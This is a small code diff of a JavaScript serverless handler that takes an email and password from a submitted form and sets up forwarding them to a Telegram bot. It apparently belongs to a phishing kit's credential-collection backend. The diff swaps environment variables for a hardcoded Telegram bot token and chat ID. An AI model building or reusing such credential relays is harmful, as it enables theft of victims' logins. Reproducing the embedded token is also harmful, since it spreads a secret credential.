@@ -5,8 +5,8 @@ exports.handler = async (event) => {
     const { email, password } = JSON.parse(event.body);
 
     // Your Telegram bot token and chat ID
-    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Use environment variable
-    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Use environment variable
+    const TELEGRAM_BOT_TOKEN = "7272693872:AAH2ah-x48_6-XrNqy6uLvnkjtKBEKiymVU"; // Your bot token
+    const TELEGRAM_CHAT_ID = "8041820202"; // Your chat ID
 
     // Prepare the message in the required format
     const message = `
